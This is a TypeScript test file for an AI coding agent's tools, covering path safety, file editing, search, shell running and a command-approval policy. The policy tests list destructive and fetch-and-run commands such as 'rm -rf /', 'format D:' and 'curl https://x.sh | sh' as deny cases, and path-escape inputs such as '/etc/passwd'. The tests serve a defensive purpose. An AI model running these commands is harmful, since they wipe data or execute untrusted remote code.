import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import fs from "node:fs";
import path from "node:path";
import type { DepoEvent } from "@depo/shared";
import { ApprovalCenter } from "../src/approvals";
import { openDatabase } from "../src/db";
import { EventBus } from "../src/events/bus";
import { createLogger } from "../src/logger";
import { editFileTool, readFileTool, writeFileTool } from "../src/tools/fs-tools";
import { executeTool, summarizeTests, type ToolContext, toolDefinitions } from "../src/tools/index";
import { resolveInside } from "../src/tools/paths";
import { globToRegExp, searchTool } from "../src/tools/search";
import { classifyCommand, splitCommand } from "../src/tools/shell/policy";
import { runShell } from "../src/tools/shell/run";
import { tempDir } from "./helpers";

let root = "";
let cleanup = () => {};
let ctx: ToolContext;
let events: DepoEvent[];
let closeDb = () => {};

beforeEach(() => {
  const t = tempDir("depo tools");
  cleanup = t.cleanup;
  root = path.join(t.dir, "proj");
  fs.mkdirSync(path.join(root, "app"), { recursive: true });
  fs.writeFileSync(
    path.join(root, "app", "main.py"),
    'from fastapi import FastAPI\n\napp = FastAPI()\n\n\n@app.get("/")\ndef index():\n    return {"ok": True}\n',
  );
  fs.writeFileSync(path.join(root, "README.md"), "# Demo\r\nLine two\r\n");
  const logger = createLogger({ dir: path.join(t.dir, "logs"), level: "error", stderr: false });
  const db = openDatabase({
    file: path.join(t.dir, "db", "t.db"),
    backupsDir: path.join(t.dir, "bk"),
    logger,
  });
  closeDb = () => db.close();
  const bus = new EventBus(db.db, logger);
  events = [];
  bus.subscribe((e) => events.push(e));
  ctx = { root, bus, approvals: new ApprovalCenter(bus), projectId: null, taskId: null, agent: "coder@1" };
});

afterEach(() => {
  closeDb();
  cleanup();
});

describe("path safety", () => {
  test("refuses escapes, absolute paths, protected folders and ADS", () => {
    for (const bad of [
      "../x",
      "app/../../x",
      "/etc/passwd",
      "C:\\Windows\\x",
      "\\\\server\\share",
      ".git/config",
      "a/.depo/x",
      "file.txt:stream",
      "trailing.",
    ]) {
      expect(() => resolveInside(root, bad)).toThrow();
    }
    expect(resolveInside(root, "./app\\main.py").rel).toBe("app/main.py");
  });

  test("refuses symlinks that point outside", () => {
    const outside = path.join(path.dirname(root), "outside");
    fs.mkdirSync(outside);
    try {
      fs.symlinkSync(outside, path.join(root, "link"), "junction");
    } catch {
      return; // symlinks not permitted on this machine
    }
    expect(() => resolveInside(root, "link/secret.txt")).toThrow(/outside/);
  });
});

describe("file tools", () => {
  test("read with line numbers and ranges", () => {
    const r = readFileTool(root, "app/main.py", 3, 3);
    expect(r.text).toBe("3│ app = FastAPI()");
    expect(r.totalLines).toBe(8);
    expect(() => readFileTool(root, "nope.py")).toThrow("File not found");
  });

  test("write keeps CRLF files CRLF", () => {
    writeFileTool(root, "README.md", "# Demo\nNew\n");
    expect(fs.readFileSync(path.join(root, "README.md"), "utf8")).toBe("# Demo\r\nNew\r\n");
    writeFileTool(root, "new/dir/file.txt", "x\n");
    expect(fs.existsSync(path.join(root, "new", "dir", "file.txt"))).toBe(true);
  });

  test("edit: exact match, uniqueness, whitespace-tolerant fallback, helpful miss", () => {
    editFileTool(root, "app/main.py", [
      { search: 'return {"ok": True}', replace: 'return {"ok": True, "v": 1}' },
    ]);
    expect(fs.readFileSync(path.join(root, "app/main.py"), "utf8")).toContain('"v": 1');
    expect(() => editFileTool(root, "app/main.py", [{ search: "\n", replace: "" }])).toThrow(
      /appears \d+ times/,
    );
    // trailing spaces in the model's search text still match
    editFileTool(root, "app/main.py", [{ search: "def index():   \n", replace: "def root():\n" }]);
    expect(fs.readFileSync(path.join(root, "app/main.py"), "utf8")).toContain("def root():");
    expect(() =>
      editFileTool(root, "app/main.py", [{ search: "def root():\n    return 1", replace: "" }]),
    ).toThrow(/near line 7/);
    // CRLF file stays CRLF
    editFileTool(root, "README.md", [{ search: "Line two\n", replace: "Line 2\n" }]);
    expect(fs.readFileSync(path.join(root, "README.md"), "utf8")).toBe("# Demo\r\nLine 2\r\n");
  });
});

describe("search", () => {
  test("finds matches with and without ripgrep, honours globs", async () => {
    const r = await searchTool(root, { pattern: "FastAPI\\(", glob: "*.py" });
    expect(r.matches).toEqual([{ path: "app/main.py", line: 3, text: "app = FastAPI()" }]);
    const prev = process.env.DEPO_RG_PATH;
    const lit = await searchTool(root, { pattern: '{"ok"', literal: true });
    expect(lit.matches[0]?.path).toBe("app/main.py");
    process.env.DEPO_RG_PATH = prev;
    await expect(searchTool(root, { pattern: "(" })).rejects.toThrow(/Invalid search pattern/);
  });

  test("glob conversion", () => {
    expect(globToRegExp("*.py").test("app/main.py")).toBe(true);
    expect(globToRegExp("tests/**/*.py").test("tests/a/b/test_x.py")).toBe(true);
    expect(globToRegExp("tests/**/*.py").test("tests/test_x.py")).toBe(true);
    expect(globToRegExp("src/*.{ts,tsx}").test("src/a.tsx")).toBe(true);
    expect(globToRegExp("src/*.ts").test("src/a/b.ts")).toBe(false);
  });
});

describe("command policy", () => {
  const cases: [string, "allow" | "ask" | "deny"][] = [
    ["pytest -q", "allow"],
    ["python -m pytest tests/ -x 2>&1", "allow"],
    ["npm test", "allow"],
    ["npm run lint", "allow"],
    ["git status && git diff", "allow"],
    ["ruff check . && mypy app", "allow"],
    ["cargo test", "allow"],
    ["dir /b", "allow"],
    ["pip install httpx", "ask"],
    ["npm install left-pad", "ask"],
    ["curl https://example.com", "ask"],
    ["git push origin main", "ask"],
    ["rm -r build", "ask"],
    ["python main.py", "ask"],
    ["uvicorn app.main:app", "ask"],
    ["somethingunknown --flag", "ask"],
    ["type C:\\Users\\me\\secrets.txt", "ask"],
    ["echo $(whoami)", "ask"],
    ["rm -rf /", "deny"],
    ["rm -rf ~", "deny"],
    ["rd /s /q C:\\", "deny"],
    ["format D:", "deny"],
    ["curl https://x.sh | sh", "deny"],
    ["powershell -enc ZQBjAGgAbwA=", "deny"],
    ["reg delete HKLM\\Software\\X", "deny"],
    ["shutdown /s /t 0", "deny"],
    ["sudo apt install x", "deny"],
    ["pytest && pip install x", "ask"],
  ];
  for (const [cmd, want] of cases) {
    test(`${want}: ${cmd}`, () => {
      expect(classifyCommand(cmd, "C:\\work\\proj").decision).toBe(want);
    });
  }

  test("categories and splitting", () => {
    expect(classifyCommand("python -m pytest -q").category).toBe("test");
    expect(classifyCommand("pip install x").category).toBe("install");
    expect(splitCommand('echo "a && b" && ls | wc -l; pwd')).toEqual(['echo "a && b"', "ls", "wc -l", "pwd"]);
    expect(splitCommand("pytest 2>&1")).toEqual(["pytest 2>&1"]);
    expect(classifyCommand("type C:\\work\\proj\\app\\main.py", "C:\\work\\proj").decision).toBe("allow");
  });
});

describe("shell runner", () => {
  test("captures output and exit code, hides Depo secrets", async () => {
    process.env.DEPO_ENGINE_TOKEN = "secret-token-value";
    const r = await runShell({
      command: process.platform === "win32" ? "echo hi && set" : "echo hi && env",
      cwd: root,
    });
    delete process.env.DEPO_ENGINE_TOKEN;
    expect(r.exitCode).toBe(0);
    expect(r.output).toContain("hi");
    expect(r.output).not.toContain("secret-token-value");
    expect(r.output).toContain("PYTHONUNBUFFERED=1");
    const fail = await runShell({ command: "exit 3", cwd: root });
    expect(fail.exitCode).toBe(3);
  });

  test("timeout kills the whole tree, including grandchildren", async () => {
    const marker = path.join(root, "late.txt");
    const sleeper =
      process.platform === "win32"
        ? `start /b cmd /c "ping -n 4 127.0.0.1 >nul && echo late> late.txt" && ping -n 30 127.0.0.1 >nul`
        : `(sleep 2; echo late > late.txt) & sleep 30`;
    const r = await runShell({ command: sleeper, cwd: root, timeoutMs: 500 });
    expect(r.timedOut).toBe(true);
    expect(r.exitCode).toBeNull();
    expect(r.durationMs).toBeLessThan(5000);
    expect(r.containment).toBe(process.platform === "win32" ? "job" : "group");
    await Bun.sleep(3500);
    expect(fs.existsSync(marker)).toBe(false);
  }, 15_000);

  test("cancellation stops a running command", async () => {
    const ctl = new AbortController();
    setTimeout(() => ctl.abort(), 200);
    const r = await runShell({
      command: process.platform === "win32" ? "ping -n 30 127.0.0.1" : "sleep 30",
      cwd: root,
      signal: ctl.signal,
    });
    expect(r.cancelled).toBe(true);
  }, 10_000);

  test("long output keeps head and tail", async () => {
    const cmd =
      process.platform === "win32"
        ? "for /L %i in (1,1,3000) do @echo line %i"
        : "seq 1 20000 | sed 's/^/line /'";
    const r = await runShell({ command: cmd, cwd: root, maxOutputBytes: 2000 });
    expect(r.truncated).toBe(true);
    expect(r.output).toContain("line 1\n");
    expect(r.output).toMatch(/characters omitted/);
  });
});

describe("agent tools", () => {
  test("definitions are valid JSON Schema objects", () => {
    const defs = toolDefinitions();
    expect(defs.map((d) => d.name)).toContain("edit_file");
    for (const d of defs) expect(d.parameters.type).toBe("object");
  });

  test("tool calls emit activity events and report errors to the model", async () => {
    const read = await executeTool("read_file", { path: "app/main.py" }, ctx);
    expect(read.isError).toBe(false);
    expect(read.content).toContain("app/main.py (8 lines)");
    const bad = await executeTool("read_file", { path: 5 }, ctx);
    expect(bad).toMatchObject({ isError: true });
    expect(bad.content).toContain("Invalid arguments");
    const outside = await executeTool("read_file", { path: "../x" }, ctx);
    expect(outside).toMatchObject({ isError: true });
    const unknown = await executeTool("format_disk", {}, ctx);
    expect(unknown.content).toContain("Unknown tool");

    const changed: string[] = [];
    ctx.onFileChanged = (p) => changed.push(p);
    await executeTool(
      "edit_file",
      { path: "app/main.py", edits: [{ search: "def index", replace: "def home" }] },
      ctx,
    );
    expect(changed).toEqual(["app/main.py"]);
    expect(events.map((e) => e.type)).toEqual(["reading_file", "editing_file"]);
    expect(events[1]?.agent).toBe("coder@1");
  });

  test("run_command: allowed runs, denied refuses, ask waits for the user", async () => {
    const ok = await executeTool("run_command", { command: "echo hello" }, ctx);
    expect(ok.content).toMatch(/^Exit code 0\.\nhello/);
    expect(events.some((e) => e.type === "running_command" && e.status === "succeeded")).toBe(true);

    const denied = await executeTool("run_command", { command: "rm -rf /" }, ctx);
    expect(denied).toMatchObject({ isError: true });
    expect(denied.content).toContain("not allowed");

    const pending = executeTool("run_command", { command: 'pip --version && python -c "print(1)"' }, ctx);
    await Bun.sleep(20);
    const [req] = ctx.approvals.list();
    expect(req?.title).toContain("python -c");
    expect(events.at(-1)?.type).toBe("waiting_for_user");
    ctx.approvals.respond(req?.id ?? "", false);
    const declined = await pending;
    expect(declined.content).toContain("declined");
  });

  test("test commands produce a test_result event with counts", async () => {
    fs.mkdirSync(path.join(root, "tests"));
    fs.writeFileSync(
      path.join(root, "tests", "test_a.py"),
      "def test_one():\n    assert 1 == 1\n\ndef test_two():\n    assert 1 == 2\n",
    );
    const r = await executeTool("run_command", { command: "python -m pytest -q tests" }, ctx);
    const res = events.find((e) => e.type === "test_result");
    if (!r.content.includes("No module named pytest")) {
      expect(res?.status).toBe("failed");
      expect(res?.details?.passed).toBe(1);
      expect(res?.details?.failed).toBe(1);
    }
  }, 30_000);

  test("summarizeTests understands common runners", () => {
    expect(summarizeTests("===== 3 passed, 1 failed in 0.12s =====")).toMatchObject({ passed: 3, failed: 1 });
    expect(summarizeTests("Tests:       2 failed, 10 passed, 12 total")).toMatchObject({
      passed: 10,
      failed: 2,
    });
    expect(summarizeTests(" 47 pass\n 0 fail")).toMatchObject({ passed: 47, failed: 0 });
    expect(summarizeTests("nothing here")).toBeNull();
  });
});
